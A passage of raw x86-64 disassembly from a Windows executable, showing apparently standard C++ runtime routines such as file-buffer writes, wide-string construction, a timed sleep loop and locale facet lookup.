   140005982:	75 68                	jne    0x1400059ec
   140005984:	0f be 4c 24 50       	movsbl 0x50(%rsp),%ecx
   140005989:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140005990:	ff 15 d2 2b 00 00    	call   *0x2bd2(%rip)        # 0x140008568
   140005996:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000599b:	3b c1                	cmp    %ecx,%eax
   14000599d:	0f 45 cf             	cmovne %edi,%ecx
   1400059a0:	8b c1                	mov    %ecx,%eax
   1400059a2:	eb 4d                	jmp    0x1400059f1
   1400059a4:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400059a9:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400059ae:	48 2b f0             	sub    %rax,%rsi
   1400059b1:	74 1f                	je     0x1400059d2
   1400059b3:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   1400059ba:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400059bf:	4c 8b c6             	mov    %rsi,%r8
   1400059c2:	ba 01 00 00 00       	mov    $0x1,%edx
   1400059c7:	ff 15 6b 2b 00 00    	call   *0x2b6b(%rip)        # 0x140008538
   1400059cd:	48 3b f0             	cmp    %rax,%rsi
   1400059d0:	75 1a                	jne    0x1400059ec
   1400059d2:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400059d7:	c6 43 71 01          	movb   $0x1,0x71(%rbx)
   1400059db:	48 39 44 24 48       	cmp    %rax,0x48(%rsp)
   1400059e0:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400059e5:	0f 45 cf             	cmovne %edi,%ecx
   1400059e8:	8b c1                	mov    %ecx,%eax
   1400059ea:	eb 05                	jmp    0x1400059f1
   1400059ec:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400059f1:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   1400059f8:	00 
   1400059f9:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400059fe:	48 33 cc             	xor    %rsp,%rcx
   140005a01:	e8 3a 0e 00 00       	call   0x140006840
   140005a06:	48 8b 9c 24 a8 00 00 	mov    0xa8(%rsp),%rbx
   140005a0d:	00 
   140005a0e:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140005a15:	5f                   	pop    %rdi
   140005a16:	c3                   	ret
   140005a17:	cc                   	int3
   140005a18:	cc                   	int3
   140005a19:	cc                   	int3
   140005a1a:	cc                   	int3
   140005a1b:	cc                   	int3
   140005a1c:	cc                   	int3
   140005a1d:	cc                   	int3
   140005a1e:	cc                   	int3
   140005a1f:	cc                   	int3
   140005a20:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005a27:	48 85 c9             	test   %rcx,%rcx
   140005a2a:	74 07                	je     0x140005a33
   140005a2c:	48 ff 25 ed 29 00 00 	rex.W jmp *0x29ed(%rip)        # 0x140008420
   140005a33:	c3                   	ret
   140005a34:	cc                   	int3
   140005a35:	cc                   	int3
   140005a36:	cc                   	int3
   140005a37:	cc                   	int3
   140005a38:	cc                   	int3
   140005a39:	cc                   	int3
   140005a3a:	cc                   	int3
   140005a3b:	cc                   	int3
   140005a3c:	cc                   	int3
   140005a3d:	cc                   	int3
   140005a3e:	cc                   	int3
   140005a3f:	cc                   	int3
   140005a40:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005a47:	48 85 c9             	test   %rcx,%rcx
   140005a4a:	74 07                	je     0x140005a53
   140005a4c:	48 ff 25 d5 29 00 00 	rex.W jmp *0x29d5(%rip)        # 0x140008428
   140005a53:	c3                   	ret
   140005a54:	cc                   	int3
   140005a55:	cc                   	int3
   140005a56:	cc                   	int3
   140005a57:	cc                   	int3
   140005a58:	cc                   	int3
   140005a59:	cc                   	int3
   140005a5a:	cc                   	int3
   140005a5b:	cc                   	int3
   140005a5c:	cc                   	int3
   140005a5d:	cc                   	int3
   140005a5e:	cc                   	int3
   140005a5f:	cc                   	int3
   140005a60:	40 53                	rex push %rbx
   140005a62:	48 83 ec 20          	sub    $0x20,%rsp
   140005a66:	48 8b d9             	mov    %rcx,%rbx
   140005a69:	48 8d 05 28 33 00 00 	lea    0x3328(%rip),%rax        # 0x140008d98
   140005a70:	48 89 01             	mov    %rax,(%rcx)
   140005a73:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140005a7a:	00 
   140005a7b:	74 2f                	je     0x140005aac
   140005a7d:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140005a81:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140005a85:	48 39 01             	cmp    %rax,(%rcx)
   140005a88:	75 22                	jne    0x140005aac
   140005a8a:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   140005a91:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140005a98:	48 89 11             	mov    %rdx,(%rcx)
   140005a9b:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005a9f:	48 89 10             	mov    %rdx,(%rax)
   140005aa2:	44 2b c2             	sub    %edx,%r8d
   140005aa5:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005aa9:	44 89 00             	mov    %r8d,(%rax)
   140005aac:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140005ab0:	74 08                	je     0x140005aba
   140005ab2:	48 8b cb             	mov    %rbx,%rcx
   140005ab5:	e8 d6 05 00 00       	call   0x140006090
   140005aba:	48 8b cb             	mov    %rbx,%rcx
   140005abd:	48 83 c4 20          	add    $0x20,%rsp
   140005ac1:	5b                   	pop    %rbx
   140005ac2:	48 ff 25 9f 26 00 00 	rex.W jmp *0x269f(%rip)        # 0x140008168
   140005ac9:	cc                   	int3
   140005aca:	cc                   	int3
   140005acb:	cc                   	int3
   140005acc:	cc                   	int3
   140005acd:	cc                   	int3
   140005ace:	cc                   	int3
   140005acf:	cc                   	int3
   140005ad0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005ad5:	57                   	push   %rdi
   140005ad6:	48 83 ec 20          	sub    $0x20,%rsp
   140005ada:	48 8d b9 58 ff ff ff 	lea    -0xa8(%rcx),%rdi
   140005ae1:	8b da                	mov    %edx,%ebx
   140005ae3:	48 8b cf             	mov    %rdi,%rcx
   140005ae6:	e8 25 db ff ff       	call   0x140003610
   140005aeb:	f6 c3 01             	test   $0x1,%bl
   140005aee:	74 0d                	je     0x140005afd
   140005af0:	ba 08 01 00 00       	mov    $0x108,%edx
   140005af5:	48 8b cf             	mov    %rdi,%rcx
   140005af8:	e8 63 0d 00 00       	call   0x140006860
   140005afd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005b02:	48 8b c7             	mov    %rdi,%rax
   140005b05:	48 83 c4 20          	add    $0x20,%rsp
   140005b09:	5f                   	pop    %rdi
   140005b0a:	c3                   	ret
   140005b0b:	cc                   	int3
   140005b0c:	cc                   	int3
   140005b0d:	cc                   	int3
   140005b0e:	cc                   	int3
   140005b0f:	cc                   	int3
   140005b10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005b15:	57                   	push   %rdi
   140005b16:	48 83 ec 20          	sub    $0x20,%rsp
   140005b1a:	8b fa                	mov    %edx,%edi
   140005b1c:	48 8b d9             	mov    %rcx,%rbx
   140005b1f:	48 8d 05 72 32 00 00 	lea    0x3272(%rip),%rax        # 0x140008d98
   140005b26:	48 89 01             	mov    %rax,(%rcx)
   140005b29:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140005b30:	00 
   140005b31:	74 2d                	je     0x140005b60
   140005b33:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   140005b37:	48 8d 41 70          	lea    0x70(%rcx),%rax
   140005b3b:	49 39 00             	cmp    %rax,(%r8)
   140005b3e:	75 20                	jne    0x140005b60
   140005b40:	48 8b 91 90 00 00 00 	mov    0x90(%rcx),%rdx
   140005b47:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   140005b4e:	49 89 08             	mov    %rcx,(%r8)
   140005b51:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005b55:	48 89 08             	mov    %rcx,(%rax)
   140005b58:	2b d1                	sub    %ecx,%edx
   140005b5a:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005b5e:	89 10                	mov    %edx,(%rax)
   140005b60:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140005b64:	74 08                	je     0x140005b6e
   140005b66:	48 8b cb             	mov    %rbx,%rcx
   140005b69:	e8 22 05 00 00       	call   0x140006090
   140005b6e:	48 8b cb             	mov    %rbx,%rcx
   140005b71:	ff 15 f1 25 00 00    	call   *0x25f1(%rip)        # 0x140008168
   140005b77:	90                   	nop
   140005b78:	40 f6 c7 01          	test   $0x1,%dil
   140005b7c:	74 0d                	je     0x140005b8b
   140005b7e:	ba 98 00 00 00       	mov    $0x98,%edx
   140005b83:	48 8b cb             	mov    %rbx,%rcx
   140005b86:	e8 d5 0c 00 00       	call   0x140006860
   140005b8b:	48 8b c3             	mov    %rbx,%rax
   140005b8e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005b93:	48 83 c4 20          	add    $0x20,%rsp
   140005b97:	5f                   	pop    %rdi
   140005b98:	c3                   	ret
   140005b99:	cc                   	int3
   140005b9a:	cc                   	int3
   140005b9b:	cc                   	int3
   140005b9c:	cc                   	int3
   140005b9d:	cc                   	int3
   140005b9e:	cc                   	int3
   140005b9f:	cc                   	int3
   140005ba0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005ba5:	55                   	push   %rbp
   140005ba6:	56                   	push   %rsi
   140005ba7:	57                   	push   %rdi
   140005ba8:	41 56                	push   %r14
   140005baa:	41 57                	push   %r15
   140005bac:	48 83 ec 30          	sub    $0x30,%rsp
   140005bb0:	45 33 ff             	xor    %r15d,%r15d
   140005bb3:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005bb6:	49 8b d8             	mov    %r8,%rbx
   140005bb9:	4c 8b f2             	mov    %rdx,%r14
   140005bbc:	48 8b f9             	mov    %rcx,%rdi
   140005bbf:	0f 11 01             	movups %xmm0,(%rcx)
   140005bc2:	4c 89 79 10          	mov    %r15,0x10(%rcx)
   140005bc6:	4c 89 79 18          	mov    %r15,0x18(%rcx)
   140005bca:	49 3b d0             	cmp    %r8,%rdx
   140005bcd:	75 11                	jne    0x140005be0
   140005bcf:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140005bd6:	00 
   140005bd7:	66 44 89 39          	mov    %r15w,(%rcx)
   140005bdb:	e9 f6 00 00 00       	jmp    0x140005cd6
   140005be0:	49 2b de             	sub    %r14,%rbx
   140005be3:	48 bd fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbp
   140005bea:	ff ff 7f 
   140005bed:	48 d1 fb             	sar    $1,%rbx
   140005bf0:	48 3b dd             	cmp    %rbp,%rbx
   140005bf3:	0f 87 f1 00 00 00    	ja     0x140005cea
   140005bf9:	48 83 fb 07          	cmp    $0x7,%rbx
   140005bfd:	77 21                	ja     0x140005c20
   140005bff:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   140005c03:	48 03 db             	add    %rbx,%rbx
   140005c06:	4c 8b c3             	mov    %rbx,%r8
   140005c09:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140005c10:	00 
   140005c11:	e8 e5 1b 00 00       	call   0x1400077fb
   140005c16:	66 44 89 3c 3b       	mov    %r15w,(%rbx,%rdi,1)
   140005c1b:	e9 b6 00 00 00       	jmp    0x140005cd6
   140005c20:	48 8b c3             	mov    %rbx,%rax
   140005c23:	48 83 c8 07          	or     $0x7,%rax
   140005c27:	48 3b c5             	cmp    %rbp,%rax
   140005c2a:	76 47                	jbe    0x140005c73
   140005c2c:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140005c33:	ff ff 7f 
   140005c36:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140005c3a:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140005c41:	72 6a                	jb     0x140005cad
   140005c43:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140005c47:	48 3b c1             	cmp    %rcx,%rax
   140005c4a:	0f 86 a0 00 00 00    	jbe    0x140005cf0
   140005c50:	48 8b c8             	mov    %rax,%rcx
   140005c53:	e8 10 0c 00 00       	call   0x140006868
   140005c58:	48 85 c0             	test   %rax,%rax
   140005c5b:	75 42                	jne    0x140005c9f
   140005c5d:	45 33 c9             	xor    %r9d,%r9d
   140005c60:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140005c65:	45 33 c0             	xor    %r8d,%r8d
   140005c68:	33 d2                	xor    %edx,%edx
   140005c6a:	33 c9                	xor    %ecx,%ecx
   140005c6c:	ff 15 96 28 00 00    	call   *0x2896(%rip)        # 0x140008508
   140005c72:	cc                   	int3
   140005c73:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140005c78:	48 8b e8             	mov    %rax,%rbp
   140005c7b:	48 3b c1             	cmp    %rcx,%rax
   140005c7e:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140005c85:	ff ff 7f 
   140005c88:	48 0f 42 e9          	cmovb  %rcx,%rbp
   140005c8c:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   140005c90:	48 3b c8             	cmp    %rax,%rcx
   140005c93:	77 5b                	ja     0x140005cf0
   140005c95:	48 03 c9             	add    %rcx,%rcx
   140005c98:	75 a0                	jne    0x140005c3a
   140005c9a:	49 8b f7             	mov    %r15,%rsi
   140005c9d:	eb 16                	jmp    0x140005cb5
   140005c9f:	48 8d 70 27          	lea    0x27(%rax),%rsi
   140005ca3:	48 83 e6 e0          	and    $0xffffffffffffffe0,%rsi
   140005ca7:	48 89 46 f8          	mov    %rax,-0x8(%rsi)
   140005cab:	eb 08                	jmp    0x140005cb5
   140005cad:	e8 b6 0b 00 00       	call   0x140006868
   140005cb2:	48 8b f0             	mov    %rax,%rsi
   140005cb5:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   140005cb9:	49 8b d6             	mov    %r14,%rdx
   140005cbc:	48 03 db             	add    %rbx,%rbx
   140005cbf:	48 89 37             	mov    %rsi,(%rdi)
   140005cc2:	4c 8b c3             	mov    %rbx,%r8
   140005cc5:	48 89 6f 18          	mov    %rbp,0x18(%rdi)
   140005cc9:	48 8b ce             	mov    %rsi,%rcx
   140005ccc:	e8 2a 1b 00 00       	call   0x1400077fb
   140005cd1:	66 44 89 3c 33       	mov    %r15w,(%rbx,%rsi,1)
   140005cd6:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   140005cdb:	48 8b c7             	mov    %rdi,%rax
   140005cde:	48 83 c4 30          	add    $0x30,%rsp
   140005ce2:	41 5f                	pop    %r15
   140005ce4:	41 5e                	pop    %r14
   140005ce6:	5f                   	pop    %rdi
   140005ce7:	5e                   	pop    %rsi
   140005ce8:	5d                   	pop    %rbp
   140005ce9:	c3                   	ret
   140005cea:	e8 c1 b6 ff ff       	call   0x1400013b0
   140005cef:	cc                   	int3
   140005cf0:	e8 9b b5 ff ff       	call   0x140001290
   140005cf5:	cc                   	int3
   140005cf6:	cc                   	int3
   140005cf7:	cc                   	int3
   140005cf8:	cc                   	int3
   140005cf9:	cc                   	int3
   140005cfa:	cc                   	int3
   140005cfb:	cc                   	int3
   140005cfc:	cc                   	int3
   140005cfd:	cc                   	int3
   140005cfe:	cc                   	int3
   140005cff:	cc                   	int3
   140005d00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005d05:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005d0a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005d0f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005d14:	41 56                	push   %r14
   140005d16:	48 83 ec 20          	sub    $0x20,%rsp
   140005d1a:	48 8b f9             	mov    %rcx,%rdi
   140005d1d:	48 be 00 00 4f 91 94 	movabs $0x4e94914f0000,%rsi
   140005d24:	4e 00 00 
   140005d27:	48 bd db 34 b6 d7 82 	movabs $0x431bde82d7b634db,%rbp
   140005d2e:	de 1b 43 
   140005d31:	49 be f3 8c 90 94 07 	movabs $0xb2f4fc0794908cf3,%r14
   140005d38:	fc f4 b2 
   140005d3b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005d40:	ff 15 4a 24 00 00    	call   *0x244a(%rip)        # 0x140008190
   140005d46:	48 8b d8             	mov    %rax,%rbx
   140005d49:	ff 15 a1 24 00 00    	call   *0x24a1(%rip)        # 0x1400081f0
   140005d4f:	48 8b c8             	mov    %rax,%rcx
   140005d52:	48 81 fb 80 96 98 00 	cmp    $0x989680,%rbx
   140005d59:	75 06                	jne    0x140005d61
   140005d5b:	48 6b c1 64          	imul   $0x64,%rcx,%rax
   140005d5f:	eb 71                	jmp    0x140005dd2
   140005d61:	48 81 fb 00 36 6e 01 	cmp    $0x16e3600,%rbx
   140005d68:	75 4a                	jne    0x140005db4
   140005d6a:	49 8b c6             	mov    %r14,%rax
   140005d6d:	48 f7 e9             	imul   %rcx
   140005d70:	4c 8d 04 11          	lea    (%rcx,%rdx,1),%r8
   140005d74:	49 c1 f8 18          	sar    $0x18,%r8
   140005d78:	49 8b c0             	mov    %r8,%rax
   140005d7b:	48 c1 e8 3f          	shr    $0x3f,%rax
   140005d7f:	4c 03 c0             	add    %rax,%r8
   140005d82:	49 69 c0 00 36 6e 01 	imul   $0x16e3600,%r8,%rax
   140005d89:	48 2b c8             	sub    %rax,%rcx
   140005d8c:	49 8b c6             	mov    %r14,%rax
   140005d8f:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   140005d96:	48 f7 e9             	imul   %rcx
   140005d99:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   140005d9d:	48 c1 f8 18          	sar    $0x18,%rax
   140005da1:	48 8b c8             	mov    %rax,%rcx
   140005da4:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140005da8:	48 03 c1             	add    %rcx,%rax
   140005dab:	49 69 c8 00 ca 9a 3b 	imul   $0x3b9aca00,%r8,%rcx
   140005db2:	eb 1b                	jmp    0x140005dcf
   140005db4:	48 99                	cqto
   140005db6:	48 f7 fb             	idiv   %rbx
   140005db9:	48 8b c8             	mov    %rax,%rcx
   140005dbc:	48 69 c2 00 ca 9a 3b 	imul   $0x3b9aca00,%rdx,%rax
   140005dc3:	48 99                	cqto
   140005dc5:	48 f7 fb             	idiv   %rbx
   140005dc8:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   140005dcf:	48 03 c1             	add    %rcx,%rax
   140005dd2:	48 8b 0f             	mov    (%rdi),%rcx
   140005dd5:	48 3b c1             	cmp    %rcx,%rax
   140005dd8:	7d 47                	jge    0x140005e21
   140005dda:	48 2b c8             	sub    %rax,%rcx
   140005ddd:	48 3b ce             	cmp    %rsi,%rcx
   140005de0:	7e 11                	jle    0x140005df3
   140005de2:	ba 00 5c 26 05       	mov    $0x5265c00,%edx
   140005de7:	8b ca                	mov    %edx,%ecx
   140005de9:	e8 96 08 00 00       	call   0x140006684
   140005dee:	e9 4d ff ff ff       	jmp    0x140005d40
   140005df3:	48 8b c5             	mov    %rbp,%rax
   140005df6:	48 f7 e9             	imul   %rcx
   140005df9:	48 c1 fa 12          	sar    $0x12,%rdx
   140005dfd:	48 8b c2             	mov    %rdx,%rax
   140005e00:	48 c1 e8 3f          	shr    $0x3f,%rax
   140005e04:	48 03 d0             	add    %rax,%rdx
   140005e07:	48 69 c2 40 42 0f 00 	imul   $0xf4240,%rdx,%rax
   140005e0e:	48 3b c1             	cmp    %rcx,%rax
   140005e11:	7d 02                	jge    0x140005e15
   140005e13:	ff c2                	inc    %edx
   140005e15:	8b ca                	mov    %edx,%ecx
   140005e17:	e8 68 08 00 00       	call   0x140006684
   140005e1c:	e9 1f ff ff ff       	jmp    0x140005d40
   140005e21:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005e26:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005e2b:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005e30:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140005e35:	48 83 c4 20          	add    $0x20,%rsp
   140005e39:	41 5e                	pop    %r14
   140005e3b:	c3                   	ret
   140005e3c:	cc                   	int3
   140005e3d:	cc                   	int3
   140005e3e:	cc                   	int3
   140005e3f:	cc                   	int3
   140005e40:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005e45:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140005e4a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005e4f:	57                   	push   %rdi
   140005e50:	48 83 ec 40          	sub    $0x40,%rsp
   140005e54:	48 8b 05 e5 71 00 00 	mov    0x71e5(%rip),%rax        # 0x14000d040
   140005e5b:	48 33 c4             	xor    %rsp,%rax
   140005e5e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140005e63:	48 8b e9             	mov    %rcx,%rbp
   140005e66:	33 d2                	xor    %edx,%edx
   140005e68:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140005e6d:	ff 15 2d 23 00 00    	call   *0x232d(%rip)        # 0x1400081a0
   140005e73:	90                   	nop
   140005e74:	48 8b 05 fd 7a 00 00 	mov    0x7afd(%rip),%rax        # 0x14000d978
   140005e7b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005e80:	48 8b 1d 39 23 00 00 	mov    0x2339(%rip),%rbx        # 0x1400081c0
   140005e87:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140005e8b:	75 2d                	jne    0x140005eba
   140005e8d:	33 d2                	xor    %edx,%edx
   140005e8f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005e94:	ff 15 06 23 00 00    	call   *0x2306(%rip)        # 0x1400081a0
   140005e9a:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140005e9e:	75 0f                	jne    0x140005eaf
   140005ea0:	48 8b 05 11 23 00 00 	mov    0x2311(%rip),%rax        # 0x1400081b8
   140005ea7:	ff 00                	incl   (%rax)
   140005ea9:	48 63 00             	movslq (%rax),%rax
   140005eac:	48 89 03             	mov    %rax,(%rbx)
   140005eaf:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005eb4:	ff 15 de 22 00 00    	call   *0x22de(%rip)        # 0x140008198
   140005eba:	48 8b 33             	mov    (%rbx),%rsi
   140005ebd:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   140005ec1:	48 8d 3c f5 00 00 00 	lea    0x0(,%rsi,8),%rdi
   140005ec8:	00 
   140005ec9:	48 3b 71 18          	cmp    0x18(%rcx),%rsi
   140005ecd:	73 0f                	jae    0x140005ede
   140005ecf:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140005ed3:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   140005ed7:	48 85 db             	test   %rbx,%rbx
   140005eda:	75 68                	jne    0x140005f44
   140005edc:	eb 02                	jmp    0x140005ee0
   140005ede:	33 db                	xor    %ebx,%ebx
   140005ee0:	80 79 24 00          	cmpb   $0x0,0x24(%rcx)
   140005ee4:	74 14                	je     0x140005efa
   140005ee6:	ff 15 c4 22 00 00    	call   *0x22c4(%rip)        # 0x1400081b0
   140005eec:	48 3b 70 18          	cmp    0x18(%rax),%rsi
   140005ef0:	73 0d                	jae    0x140005eff
   140005ef2:	48 8b 40 10          	mov    0x10(%rax),%rax
   140005ef6:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   140005efa:	48 85 db             	test   %rbx,%rbx
   140005efd:	75 45                	jne    0x140005f44
   140005eff:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140005f04:	48 85 db             	test   %rbx,%rbx
   140005f07:	75 3b                	jne    0x140005f44
   140005f09:	48 8b d5             	mov    %rbp,%rdx
   140005f0c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005f11:	ff 15 09 23 00 00    	call   *0x2309(%rip)        # 0x140008220
   140005f17:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005f1b:	74 57                	je     0x140005f74
   140005f1d:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140005f22:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140005f27:	48 8b cb             	mov    %rbx,%rcx
   140005f2a:	e8 15 07 00 00       	call   0x140006644
   140005f2f:	48 8b 03             	mov    (%rbx),%rax
   140005f32:	48 8b cb             	mov    %rbx,%rcx
   140005f35:	ff 50 08             	call   *0x8(%rax)
   140005f38:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140005f3d:	48 89 1d 34 7a 00 00 	mov    %rbx,0x7a34(%rip)        # 0x14000d978
   140005f44:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140005f49:	ff 15 49 22 00 00    	call   *0x2249(%rip)        # 0x140008198
   140005f4f:	48 8b c3             	mov    %rbx,%rax
   140005f52:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140005f57:	48 33 cc             	xor    %rsp,%rcx
   140005f5a:	e8 e1 08 00 00       	call   0x140006840
   140005f5f:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140005f64:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140005f69:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140005f6e:	48 83 c4 40          	add    $0x40,%rsp
   140005f72:	5f                   	pop    %rdi
   140005f73:	c3                   	ret
   140005f74:	e8 b7 b2 ff ff       	call   0x140001230
   140005f79:	90                   	nop
   140005f7a:	cc                   	int3
   140005f7b:	cc                   	int3
   140005f7c:	cc                   	int3
   140005f7d:	cc                   	int3
   140005f7e:	cc                   	int3
   140005f7f:	cc                   	int3
   140005f80:	48 8b 09             	mov    (%rcx),%rcx
   140005f83:	48 85 c9             	test   %rcx,%rcx
   140005f86:	74 0b                	je     0x140005f93
   140005f88:	48 8b 01             	mov    (%rcx),%rax
   140005f8b:	ba 01 00 00 00       	mov    $0x1,%edx
   140005f90:	48 ff 20             	rex.W jmp *(%rax)
   140005f93:	c3                   	ret
   140005f94:	cc                   	int3
   140005f95:	cc                   	int3
   140005f96:	cc                   	int3
   140005f97:	cc                   	int3
   140005f98:	cc                   	int3
   140005f99:	cc                   	int3
   140005f9a:	cc                   	int3
   140005f9b:	cc                   	int3
   140005f9c:	cc                   	int3
   140005f9d:	cc                   	int3
   140005f9e:	cc                   	int3
   140005f9f:	cc                   	int3
   140005fa0:	40 53                	rex push %rbx
   140005fa2:	48 83 ec 60          	sub    $0x60,%rsp
   140005fa6:	48 8b 05 93 70 00 00 	mov    0x7093(%rip),%rax        # 0x14000d040
   140005fad:	48 33 c4             	xor    %rsp,%rax
   140005fb0:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140005fb5:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140005fba:	48 8b d9             	mov    %rcx,%rbx
   140005fbd:	0f 84 b0 00 00 00    	je     0x140006073
   140005fc3:	80 79 71 00          	cmpb   $0x0,0x71(%rcx)
   140005fc7:	0f 84 a6 00 00 00    	je     0x140006073
   140005fcd:	48 8b 01             	mov    (%rcx),%rax
   140005fd0:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140005fd5:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   140005fda:	ff 50 18             	call   *0x18(%rax)
   140005fdd:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005fe0:	0f 84 89 00 00 00    	je     0x14000606f
   140005fe6:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140005fea:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140005fef:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140005ff3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005ff8:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140005ffd:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140006002:	ff 15 10 22 00 00    	call   *0x2210(%rip)        # 0x140008218
   140006008:	85 c0                	test   %eax,%eax
   14000600a:	74 28                	je     0x140006034
   14000600c:	83 e8 01             	sub    $0x1,%eax
   14000600f:	74 27                	je     0x140006038
   140006011:	83 f8 02             	cmp    $0x2,%eax
   140006014:	75 59                	jne    0x14000606f
   140006016:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   14000601a:	b0 01                	mov    $0x1,%al
   14000601c:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140006021:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140006026:	48 33 cc             	xor    %rsp,%rcx
   140006029:	e8 12 08 00 00       	call   0x140006840
   14000602e:	48 83 c4 60          	add    $0x60,%rsp
   140006032:	5b                   	pop    %rbx
   140006033:	c3                   	ret
   140006034:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   140006038:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   14000603d:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140006042:	48 2b f8             	sub    %rax,%rdi
   140006045:	74 1f                	je     0x140006066
   140006047:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   14000604e:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140006053:	4c 8b c7             	mov    %rdi,%r8
   140006056:	ba 01 00 00 00       	mov    $0x1,%edx
   14000605b:	ff 15 d7 24 00 00    	call   *0x24d7(%rip)        # 0x140008538
   140006061:	48 3b f8             	cmp    %rax,%rdi
